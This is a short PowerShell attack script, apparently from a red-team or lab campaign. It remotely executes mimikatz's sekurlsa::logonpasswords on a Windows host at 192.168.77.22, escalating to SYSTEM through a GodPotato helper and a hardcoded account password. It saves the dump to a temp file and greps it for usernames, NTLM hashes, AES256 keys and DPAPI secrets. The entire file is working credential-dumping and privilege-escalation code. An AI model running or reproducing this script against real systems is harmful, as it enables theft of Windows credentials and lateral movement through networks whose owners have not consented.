# 3.5K: mimikatz sekurlsa live -> output to file, then read back
$ErrorActionPreference = 'Continue'

$script = @'
$ErrorActionPreference = 'Continue'
$exe = 'C:\Windows\Temp\cadre-tools\mimikatz.exe'
$outFile = 'C:\Windows\Temp\cadre-mimikatz-live.txt'
Remove-Item $outFile -ErrorAction SilentlyContinue
# Run mimikatz, redirect ALL output to file (avoid console-pipe issues in session 0)
cmd.exe /c "`"$exe`" privilege::debug sekurlsa::logonpasswords exit > `"$outFile`" 2>&1"
Start-Sleep -Seconds 2
Write-Output "MIK_FILE_EXISTS $(Test-Path $outFile)"
if (Test-Path $outFile) {
    $sz = (Get-Item $outFile).Length
    Write-Output "MIK_FILE_SIZE $sz"
    Get-Content $outFile | Select-String -Pattern 'Authentication Id|Username|Domain|NTLM|AES256|DPAPI|mimikatz' | Select-Object -First 50 | ForEach-Object { $_.Line }
}
Write-Output 'MIK_LIVE2_DONE'
'@

& 'C:\Tools\ADTools\campaign-a-t043-system-exec.ps1' -Server 192.168.77.22 -Username analyst_t1 -Password 'T13r_An@lyst!' -GpPath 'C:\Windows\Temp\cadre-tools\GodPotato.exe' -ScriptBlock $script
Write-Output 'RUN_DONE'
